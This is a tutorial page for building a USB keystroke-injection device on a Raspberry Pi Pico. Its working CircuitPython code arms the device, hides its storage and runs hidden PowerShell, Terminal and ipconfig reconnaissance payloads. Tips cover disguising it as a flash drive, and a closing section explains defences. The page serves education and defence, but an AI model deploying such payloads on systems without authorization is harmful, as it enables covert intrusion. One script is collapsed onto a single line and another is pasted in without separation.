SG-33
Authorized Use Only

Keystroke injection devices are dual-use tools. Building and studying this hardware for educational purposes is legal. Deploying it against any system without explicit written authorization from the system owner is a federal crime under 18 U.S.C. § 1030 (CFAA), the UK Computer Misuse Act 1990, and equivalent statutes worldwide. Test only on hardware you own or have documented written permission to test.

SG-33 — Red Team Hardware

USB Rubber Ducky Clone

Build a keystroke injection device using a $4 Raspberry Pi Pico running CircuitPython and the adafruit_hid library. Understand how HID attacks work from the ground up.

Intermediate ~$4 USD 2–3 Hours CircuitPython 9.x
Section 1

▶ How It Works

A USB Rubber Ducky is a microcontroller that enumerates as a USB HID keyboard when plugged into a target computer. Because every modern OS automatically loads a built-in HID driver for keyboards — with no authentication, no user confirmation, and no driver installation prompt — the device is immediately trusted. It then "types" a preprogrammed sequence of keystrokes at machine speed, executing commands in seconds that would take a human attacker far longer.

The Raspberry Pi Pico (RP2040 microcontroller) running CircuitPython with the adafruit_hid library achieves identical results to the commercial Hak5 USB Rubber Ducky at approximately 2% of the cost. The Pico presents itself to the OS as a standard USB keyboard via its native USB hardware — no additional chips required.

Attack Vector
USB HID Keyboard
Enumerates as a standard keyboard. No drivers needed. Works on Windows, macOS, Linux, Android, and ChromeOS.
Injection Speed
~1000 chars/sec
Software-limited by time.sleep() delays in payload.py. Faster than any human typist — and faster than most EDR keystroke monitors.
Dwell Time
Under 60 Seconds
A typical payload (open terminal, run command, exfil data) completes in 10–45 seconds. Physical presence required only during plug-in.

Cable Selection is Critical

Many USB Micro-B cables sold as "charging cables" omit the D+ and D- data lines entirely. The Pico will power on but will not enumerate as a USB device. Use a cable rated for data transfer — look for USB 2.0 data transfer specification on the packaging, or test with lsusb on Linux or Device Manager on Windows.

Section 3

▶ Software Setup

The build process has four stages: flash CircuitPython onto the Pico, install the adafruit_hid library, configure the safety switch, and write the payload.

STEP 1

Flash CircuitPython 9.x onto the Raspberry Pi Pico

Hold the BOOTSEL button on the Pico while connecting it to your computer via USB. The Pico mounts as a Mass Storage device named RPI-RP2. Download the CircuitPython 9.x UF2 firmware from circuitpython.org/board/raspberry_pi_pico and copy it to the drive. The Pico reboots automatically and remounts as CIRCUITPY.

Shell — Flash CircuitPython 
# macOS — copy UF2 to mounted Pico drive
cp adafruit-circuitpython-raspberry_pi_pico-en_US-9.1.4.uf2 /Volumes/RPI-RP2/

# Linux — adjust mount point as needed
cp adafruit-circuitpython-raspberry_pi_pico-en_US-9.1.4.uf2 /media/$USER/RPI-RP2/

# Windows PowerShell (Pico mounted as, e.g., D:\)
Copy-Item adafruit-circuitpython-raspberry_pi_pico-en_US-9.1.4.uf2 D:\

# After reboot, verify the CIRCUITPY drive appears
# It should contain: boot.py  code.py  lib/
STEP 2

Install the adafruit_hid Library

Download the CircuitPython Library Bundle for version 9.x from circuitpython.org/libraries. Extract it and copy the adafruit_hid folder into the lib/ directory on the CIRCUITPY drive. This library provides Keyboard, KeyboardLayoutUS, and Mouse classes.

Shell — Install adafruit_hid 
# After extracting adafruit-circuitpython-bundle-9.x-mpy-YYYYMMDD.zip:

# macOS / Linux
cp -r adafruit-circuitpython-bundle-9.x-mpy-20240901/lib/adafruit_hid /Volumes/CIRCUITPY/lib/

# Verify the lib directory structure on the Pico:
# CIRCUITPY/lib/adafruit_hid/__init__.mpy
# CIRCUITPY/lib/adafruit_hid/keyboard.mpy
# CIRCUITPY/lib/adafruit_hid/keyboard_layout_us.mpy
# CIRCUITPY/lib/adafruit_hid/keycode.mpy
# CIRCUITPY/lib/adafruit_hid/mouse.mpy
STEP 3

Configure the Safety Switch (Recommended)

Before writing your payload, wire a safety switch so the device does not inject keystrokes every time it is plugged in. A jumper between GP1 and GP2 enables "safe mode" — the payload does not run. Remove the jumper to arm the device. This is checked in boot.py before code.py executes.

▶ Wiring Diagram

No external components are required for the basic Rubber Ducky clone. The safety switch is the only optional wiring. The Pico's internal pull-up resistors handle the logic — no resistors needed.

Pro Tip: Use a Slide Switch

Instead of a bare jumper, solder a 3-pin slide switch between GP1, GP2, and GND. Slide one way to short GP1 to GP2 (safe mode), slide the other to open the circuit (attack mode). This fits inside a USB drive shell for a fully disguised device.

Section 5

▶ Complete Code

The build uses two files: boot.py (runs first, checks safety switch) and code.py (the payload runner). The safety switch check in boot.py must run before USB enumeration is complete — this is why it belongs in boot.py and not code.py.

CircuitPython — boot.py (Safety Switch) 
import board
import digitalio
import storage
import usb_hid
import time

# Safety switch: if GP1 and GP2 are shorted, disable HID and keep
# the drive writable (setup mode). Remove jumper to arm the device.
sw = digitalio.DigitalInOut(board.GP2)
sw.direction = digitalio.Direction.INPUT
sw.pull = digitalio.Pull.UP

time.sleep(0.1)  # Allow pin to settle

if sw.value:
    # GP2 is HIGH — jumper removed — ATTACK MODE
    # Disable CIRCUITPY mass storage so OS cannot detect the drive
    storage.disable_usb_drive()
    # Enable HID keyboard (this is what makes it a "rubber ducky")
    usb_hid.enable((usb_hid.Device.KEYBOARD,))
else:
    # GP2 is LOW — jumper present — SAFE MODE
    # Keep drive writable so you can edit payload files
    # HID is not enabled in this mode
    pass

sw.deinit()
CircuitPython — code.py (Payload Launcher) 
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Initialize HID keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Helper functions
def press(*keys):
    kbd.press(*keys)
    kbd.release_all()

def type_string(s, delay=0.02):
    layout.write(s)
    time.sleep(delay)

# Wait for the host OS to finish USB enumeration
time.sleep(2.0)

###############################################################
# PAYLOAD: Open Notepad and type a message (Windows target)   
###############################################################

# Open the Run dialog (Win + R)
press(Keycode.WINDOWS, Keycode.R)
time.sleep(0.6)

# Type "notepad" and press Enter
type_string("notepad")
press(Keycode.ENTER)
time.sleep(1.2)  # Wait for Notepad to open

# Type the message
type_string("[SG-33 TEST] Keystroke injection successful.\n")
type_string("Device: Raspberry Pi Pico running CircuitPython 9.x\n")
type_string("Library: adafruit_hid\n")
type_string("Timestamp: see system clock\n")
type_string("--- This device is operating in test/lab mode only ---\n")

import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def press(*keys):
    kbd.press(*keys)
    time.sleep(0.05)
    kbd.release_all()

def write(s):
    layout.write(s)

# OS detection via keyboard shortcut probing.
# Strategy: attempt to open Windows Run dialog. If it succeeds
# (window appears), we are on Windows. Otherwise try macOS Spotlight.

time.sleep(2.5)

# Attempt 1: Windows — Win+R opens Run dialog
press(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)

# If on Windows, type PowerShell command; on other OS, this is harmless
write("powershell -w hidden -c \")
write("$os = [System.Environment]::OSVersion.VersionString;")
write("Add-Content $env:TEMP\\probe.txt $os\"")
press(Keycode.ENTER)
time.sleep(0.5)

# Escape to dismiss any dialog on non-Windows systems
press(Keycode.ESCAPE)
time.sleep(0.5)

# Attempt 2: macOS — Cmd+Space opens Spotlight
press(Keycode.COMMAND, Keycode.SPACE)
time.sleep(0.8)
write("Terminal")
press(Keycode.ENTER)
time.sleep(1.5)
write("uname -a > /tmp/probe.txt\n")

Section 7

▶ Advanced Techniques

Once the basic payload is working, explore these extensions to understand more sophisticated attack vectors.

Delay Tuning

Every target machine has a different response time. A slow HDD machine opening Notepad takes 1.5+ seconds; an NVMe SSD machine takes under 300ms. Build a configurable delay multiplier into your payload and test across representative hardware. Too-short delays cause missed keystrokes; too-long delays increase attack time.

CircuitPython — Multi-Payload Selector via LED Blink Count
import board import digitalio import time import usb_hid from adafruit_hid.keyboard import Keyboard from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS from adafruit_hid.keycode import Keycode # Onboard LED for status feedback led = digitalio.DigitalInOut(board.LED) led.direction = digitalio.Direction.OUTPUT def blink(n, fast=False): for _ in range(n): led.value = True time.sleep(0.1 if fast else 0.3) led.value = False time.sleep(0.1 if fast else 0.3) # Read payload selector from settings.toml (CircuitPython 8+ feature) import os payload_id = int(os.getenv("PAYLOAD_ID", "1")) kbd = Keyboard(usb_hid.devices) layout = KeyboardLayoutUS(kbd) time.sleep(2.0) # Signal which payload is running blink(payload_id) if payload_id == 1: # Payload 1: Notepad test kbd.press(Keycode.WINDOWS, Keycode.R); kbd.release_all() time.sleep(0.6) layout.write("notepad\n") time.sleep(1.2) layout.write("Payload 1: Test\n") elif payload_id == 2: # Payload 2: Open CMD and run ipconfig kbd.press(Keycode.WINDOWS, Keycode.R); kbd.release_all() time.sleep(0.6) layout.write("cmd\n") time.sleep(1.0) layout.write("ipconfig /all > %TEMP%\\net.txt\n") blink(5, fast=True) # Signal completion

Store PAYLOAD_ID=2 in the settings.toml file on the CIRCUITPY drive to select the payload before arming. This lets you configure the device while the safety jumper is installed, then arm it for testing.

Section 8

▶ How to Defend Against This — Blue Team Perspective

Understanding the attack enables you to build effective defenses. USB HID injection is a physical access attack — the first layer of defense is physical.

USB Device Whitelisting via Group Policy (Windows)

In Windows, configure Device Installation Restrictions via Group Policy (Computer Configuration > Administrative Templates > System > Device Installation). Allow only devices with specific Vendor IDs and Product IDs. Block all other USB input devices by class GUID {745A17A0-74D3-11D0-B6FE-00A0C90F57DA} (HID). This prevents unknown HID keyboards from enumerating.

USBGuard on Linux

USBGuard creates policy rules allowing only specific USB devices. Run usbguard generate-policy to whitelist currently connected devices, then enforce the policy with usbguard-daemon. Unknown HID devices are blocked at the kernel USB stack level.

Keystroke Speed Monitoring (EDR)

Endpoint Detection and Response platforms (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) can detect abnormally fast keystroke injection. Human typists average 200–400 ms between keystrokes. Machine injection at 2–20 ms intervals is a detectable anomaly. Tuning EDR policies to alert on sustained high-speed keystroke sequences catches rubber ducky attacks.

Physical Port Controls

Enterprise solutions include USB port blockers (physical plastic inserts), epoxy-filled ports on high-security systems, and software-defined USB port disabling via BIOS (Intel ME/AMD PSP). For unattended workstations, screen lock policies combined with requiring Ctrl+Alt+Del (which a HID device cannot reliably trigger on the lock screen) reduce exposure.

Human Layer: Physical Security Awareness

The most effective defense is training users never to plug in unrecognized USB devices. Security awareness programs should include demonstrations of HID attacks (in authorized lab environments) to make the threat tangible. Found USB drives and cables in parking lots, conference rooms, and reception areas are classic social engineering vectors.
